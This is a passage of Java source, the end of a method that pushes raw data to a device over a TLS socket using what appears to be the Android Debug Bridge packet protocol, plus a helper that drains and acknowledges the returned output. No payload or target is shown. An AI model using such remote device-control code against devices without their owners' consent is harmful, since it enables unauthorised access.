            } catch (Throwable ignored) { }
            while (idle < 3) {
                int before = sink.length();
                try {
                    drain(sin, sout, localId, remoteId, sink);
                } catch (Throwable ignored) {
                }
                if (sink.length() == before) {
                    idle++;
                    try { Thread.sleep(400); } catch (Throwable ignored) { }
                } else {
                    idle = 0;
                }
            }
            v("[*] tail output: " + sink.length() + " chars");

            try { ssl.close(); } catch (Throwable ignored) { }
            ssl = null;
            try { sock.close(); } catch (Throwable ignored) { }
            sock = null;

            v("[+] raw push finished, " + data.length + " bytes fed");
            return sink.toString();
        } catch (Throwable t) {
            v("[-] pushRaw exception: " + t);
            return null;
        } finally {
            try {
                if (ssl != null) ssl.close();
            } catch (Throwable ignored) {
            }
            try {
                if (sock != null) sock.close();
            } catch (Throwable ignored) {
            }
        }
    }

    /** Drain everything currently readable, non-blockingly-ish, ACKing WRTE. */
    private void drain(InputStream sin, OutputStream sout, int localId,
                       int remoteId, StringBuilder sink) {
        try {
            while (sin.available() > 0) {
                Pkt p = readPacket(sin);
                if (p.cmd == CMD_WRTE) {
                    sink.append(new String(p.payload, "UTF-8"));
                    if (sink.length() > 16384) {
                        sink.delete(0, sink.length() - 16384);
                    }
                    writeAll(sout, packPacket(CMD_OKAY, localId, remoteId, null));
                } else if (p.cmd == CMD_OKAY) {
                    continue;
                } else if (p.cmd == CMD_CLSE) {
                    return;
                } else {
                    return;
                }
            }
        } catch (Throwable ignored) {
        }
}
}